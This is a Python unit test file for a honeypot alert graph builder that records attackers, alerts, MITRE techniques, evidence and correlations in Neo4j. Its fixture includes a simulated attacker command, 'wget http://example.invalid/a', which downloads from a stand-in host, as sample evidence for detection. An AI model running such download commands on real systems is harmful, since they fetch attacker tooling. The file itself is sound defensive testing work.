import copy
import json
import sys
from pathlib import Path
import unittest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "analyse_layer"))

from core.cyberdna_contract import CyberDNAAlertFactory
from investigation_layer.core.graph_builder import (
    CORRELATE_ALERTS,
    CORRELATED_ALERTS,
    EVIDENCE_BY_ALERT,
    HISTORY_BY_IP,
    INVESTIGATION_CONTEXT,
    SERVICES_BY_IP,
    TECHNIQUES_BY_IP,
    WRITE_GRAPH,
    CyberDNAGraphBuilder,
)


class InMemoryNeo4j:
    """Double de test qui applique les identites et relations du Cypher."""

    def __init__(self):
        self.attackers, self.alerts, self.targets = {}, {}, {}
        self.services, self.techniques, self.tactics, self.evidence = {}, {}, {}, {}
        self.triggered, self.targets_rel, self.technique_rel = set(), set(), set()
        self.evidence_rel, self.correlations = set(), set()
        self.constraints = []

    def ensure_constraints(self, statements):
        self.constraints.extend(statements)

    def run_write(self, query, parameters=None):
        parameters = parameters or {}
        if query == WRITE_GRAPH:
            attacker, alert = parameters["attacker"], parameters["alert"]
            target, service = parameters["target"], parameters["service"]
            self.attackers[attacker["ip"]] = attacker
            self.alerts[alert["alert_id"]] = alert
            self.targets[target["asset_id"]] = target
            self.services[service["service_key"]] = service
            self.triggered.add((attacker["ip"], alert["alert_id"]))
            self.targets_rel.add((alert["alert_id"], target["asset_id"], service["service_key"]))
            for technique in parameters["techniques"]:
                self.techniques[technique["technique_id"]] = technique
                self.tactics[technique["tactic"]] = {"name": technique["tactic"]}
                self.technique_rel.add((alert["alert_id"], technique["technique_id"]))
            for evidence in parameters["evidence"]:
                self.evidence[evidence["evidence_id"]] = evidence
                self.evidence_rel.add((alert["alert_id"], evidence["evidence_id"]))
        elif query == CORRELATE_ALERTS:
            current = parameters["alert_id"]
            for other, data in self.alerts.items():
                if other != current and data["correlation_key"] == parameters["correlation_key"]:
                    self.correlations.add(tuple(sorted((other, current))))
        return []

    def run_read(self, query, parameters=None):
        parameters = parameters or {}
        if query == INVESTIGATION_CONTEXT:
            source_ip, alert_id = parameters["source_ip"], parameters["alert_id"]
            if (source_ip, alert_id) not in self.triggered:
                return []
            alert_ids = [aid for ip, aid in self.triggered if ip == source_ip]
            alerts = [dict(self.alerts[aid]) for aid in alert_ids]
            targets = {target for aid, target, _ in self.targets_rel if aid in alert_ids}
            services = {service for aid, _, service in self.targets_rel if aid in alert_ids}
            technique_ids = {tid for aid, tid in self.technique_rel if aid in alert_ids}
            evidence = [dict(self.evidence[eid]) for aid, eid in self.evidence_rel if aid == alert_id]
            correlations = []
            for left, right in self.correlations:
                if alert_id in (left, right):
                    related_id = right if left == alert_id else left
                    correlations.append(dict(self.alerts[related_id]))
            return [{
                "attacker": {"ip": source_ip},
                "alerts": alerts,
                "targets": [dict(self.targets[target]) for target in targets],
                "services": [dict(self.services[service]) for service in services],
                "techniques": [dict(self.techniques[tid]) for tid in technique_ids],
                "tactics": [{"name": self.techniques[tid]["tactic"]} for tid in technique_ids],
                "evidence": evidence,
                "correlations": correlations,
            }]
        if query == HISTORY_BY_IP:
            ids = [alert_id for ip, alert_id in self.triggered if ip == parameters["ip"]]
            return [{"alert_id": alert_id} for alert_id in ids]
        if query == TECHNIQUES_BY_IP:
            ids = {alert_id for ip, alert_id in self.triggered if ip == parameters["ip"]}
            return [{"technique_id": tid} for aid, tid in self.technique_rel if aid in ids]
        if query == SERVICES_BY_IP:
            ids = {alert_id for ip, alert_id in self.triggered if ip == parameters["ip"]}
            services = {service for aid, _, service in self.targets_rel if aid in ids}
            return [{"service_key": service} for service in services]
        if query == EVIDENCE_BY_ALERT:
            return [self.evidence[eid] for aid, eid in self.evidence_rel if aid == parameters["alert_id"]]
        if query == CORRELATED_ALERTS:
            current = parameters["alert_id"]
            return [{"alert_id": right if left == current else left}
                    for left, right in self.correlations if current in (left, right)]
        return []


class GraphBuilderTests(unittest.TestCase):
    def setUp(self):
        normalized = {
            "timestamp": "2026-08-18T10:00:00Z", "source_ip": "203.0.113.10",
            "dst_port": "22", "protocol": "ssh", "event_type": "cowrie.command.input",
            "honeypot": "cowrie", "extra_info": {"input": "wget http://example.invalid/a", "password": "secret"},
        }
        verdict = {"is_alert": True, "status": "ATTACK DETECTED", "risk_score": 85, "reasons": ["test"]}
        mitre = {"id": "T1105", "name": "Ingress Tool Transfer", "tactic": "Command And Control"}
        # Alerte reelle produite par le factory de l'etape 1, puis serialisee comme analysis.cyberdna_alert.
        contract = CyberDNAAlertFactory().build(normalized, verdict, {"total_events": 12}, mitre)
        self.alert = contract.model_dump(exclude_none=True) if hasattr(contract, "model_dump") else contract.dict(exclude_none=True)
        self.store = InMemoryNeo4j()
        self.builder = CyberDNAGraphBuilder(self.store)

    def test_initialises_required_constraints(self):
        self.builder.initialise_schema()
        self.assertEqual(len(self.store.constraints), 7)
        self.assertTrue(all("IF NOT EXISTS" in statement for statement in self.store.constraints))

    def test_single_alert_creates_expected_graph_and_keeps_redaction(self):
        self.builder.ingest_alert(self.alert)
        self.assertEqual(len(self.store.attackers), 1)
        self.assertEqual(len(self.store.alerts), 1)
        self.assertEqual(len(self.store.targets), 1)
        self.assertEqual(len(self.store.services), 1)
        self.assertEqual(len(self.store.techniques), 1)
        self.assertEqual(len(self.store.evidence), 2)
        password = next(item for item in self.store.evidence.values() if item["field"] == "password")
        self.assertEqual(password["value_json"], '"<redacted>"')
        self.assertTrue(password["is_redacted"])

    def test_merges_attacker_technique_and_alert_id_and_correlates(self):
        second = copy.deepcopy(self.alert)
        second["alert_id"] = "alert-second"
        second["action"]["event_id"] = "evt-second"
        second["action"]["timestamp"] = "2026-08-18T10:05:00+00:00"
        self.builder.ingest_alert(self.alert)
        self.builder.ingest_alert(self.alert)  # meme alert_id : idempotent
        self.builder.ingest_alert(second)      # meme IP, MITRE et correlation_key
        self.assertEqual(len(self.store.attackers), 1)
        self.assertEqual(len(self.store.techniques), 1)
        self.assertEqual(len(self.store.alerts), 2)
        self.assertEqual(len(self.store.correlations), 1)

        context = self.builder.get_investigation_context("203.0.113.10", self.alert["alert_id"]).to_dict()
        self.assertEqual(set(context), {
            "attacker", "alerts", "targets", "services", "techniques", "tactics", "evidence", "correlations", "timeline",
        })
        self.assertEqual(context["attacker"], {"ip": "203.0.113.10", "alert_count": 2})
        self.assertEqual(len(context["alerts"]), 2)
        self.assertEqual(context["targets"][0]["asset_id"], "honeypot:cowrie")
        self.assertEqual(context["services"][0]["port"], 22)
        self.assertEqual(context["techniques"][0]["technique_id"], "T1105")
        self.assertEqual(context["tactics"], [{"name": "Command And Control"}])
        password = next(item for item in context["evidence"] if item["field"] == "password")
        self.assertEqual(password["value"], "<redacted>")
        self.assertTrue(password["is_redacted"])
        self.assertEqual(context["correlations"][0]["alert_id"], "alert-second")
        self.assertEqual([item["alert_id"] for item in context["timeline"]], ["alert-second", self.alert["alert_id"]])
        json.dumps(context)  # Le resultat est directement serialisable pour le futur LLM.


if __name__ == "__main__":
    unittest.main()
